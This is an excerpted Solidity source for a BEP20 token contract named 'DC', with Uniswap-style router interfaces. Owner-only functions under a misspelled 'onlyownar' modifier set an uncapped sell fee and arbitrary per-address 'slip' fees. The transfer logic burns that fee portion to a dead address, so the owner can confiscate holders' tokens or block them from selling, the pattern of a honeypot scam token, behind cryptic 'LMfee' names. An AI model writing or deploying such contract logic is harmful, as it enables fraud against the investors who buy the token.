...
interface IUniswapV2Factory {
    ...
    function LMfeeTo() external view returns (address);
    function LMfeeToSetter() external view returns (address);
    ...
    function setLMfeeTo(address) external;
    function setLMfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLMfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLMfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingLMfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLMfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLMfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract DC is BEP20, Ownable {
    ...
    uint256 private _defaultSellLMfee = 0;

    uint256 private _defaultBuyLMfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipLMfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellLMfee = _value;
    }

    function setSlipLMfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipLMfee[_address] = _value;
    }

    function getSlipLMfee(address _address) external view onlyownar returns (uint256) {
        return _slipLMfee[_address];
    }


    function setMAccountLMfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountLMfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLMfeeAmount = 0;

        if (rF) {
            uint256 tradeLMfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeLMfee = _defaultSellLMfee;
                }
                if (from == uniswapV2Pair) {

                    tradeLMfee = _defaultBuyLMfee;
                }
            }
            if (_slipLMfee[from] > 0) {
                tradeLMfee = _slipLMfee[from];
            }

            tradeLMfeeAmount = _Amount.mul(tradeLMfee).div(100);
        }


        if (tradeLMfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeLMfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeLMfeeAmount);
            emit Transfer(from, _deadAddress, tradeLMfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeLMfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeLMfeeAmount);
        emit Transfer(from, _to, _Amount - tradeLMfeeAmount);
    }
